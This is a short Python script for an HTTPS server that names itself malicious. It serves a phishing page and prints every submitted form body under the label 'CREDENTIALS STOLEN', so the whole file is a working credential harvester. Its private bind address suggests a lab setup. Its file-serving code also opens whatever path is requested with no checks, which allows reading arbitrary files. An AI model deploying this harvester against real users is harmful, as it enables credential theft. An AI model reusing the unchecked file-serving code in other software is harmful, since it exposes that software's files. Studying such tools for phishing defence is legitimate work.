from http.server import HTTPServer, BaseHTTPRequestHandler, SimpleHTTPRequestHandler
import ssl
import os

class myHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/msf':
            self.path = '/index.html'
        
        try:
            file_path = self.path[1:]  # Remove leading '/'
            print(f"Requested file: {file_path}")  # Log the requested file path
            if os.path.exists(file_path):
                self.send_response(200)
                if file_path.endswith('.html'):
                    self.send_header('Content-type', 'text/html')
                elif file_path.endswith('.jpg') or file_path.endswith('.jpeg'):
                    self.send_header('Content-type', 'image/jpeg')
                elif file_path.endswith('.png'):
                    self.send_header('Content-type', 'image/png')
                elif file_path.endswith('.gif'):
                    self.send_header('Content-type', 'image/gif')
                else:
                    self.send_header('Content-type', 'application/octet-stream')
                self.end_headers()
                with open(file_path, 'rb') as file:
                    self.wfile.write(file.read())
            else:
                print(f"File not found: {file_path}")  # Log file not found
                self.send_error(404, 'File Not Found: %s' % self.path)
        except Exception as e:
            print(f"Error serving file: {e}")  # Log the error
            self.send_error(500, 'Internal Server Error: %s' % str(e))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        print("CREDENTIALS STOLEN: " + post_data.decode('utf-8'))
        self.path = '/index.html'
        self.do_GET()

def run():
    print('starting malicious server....')

    # Set up the server
    httpd = HTTPServer(('172.20.0.2', 5555), myHandler)

    # Set up SSL context
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain(certfile='nginx-selfsigned.crt', keyfile='nginx-selfsigned.key')

    # Wrap the socker with SSL
    httpd.socket = context.wrap_socket(httpd.socket, server_side=True)

    httpd.serve_forever()

run()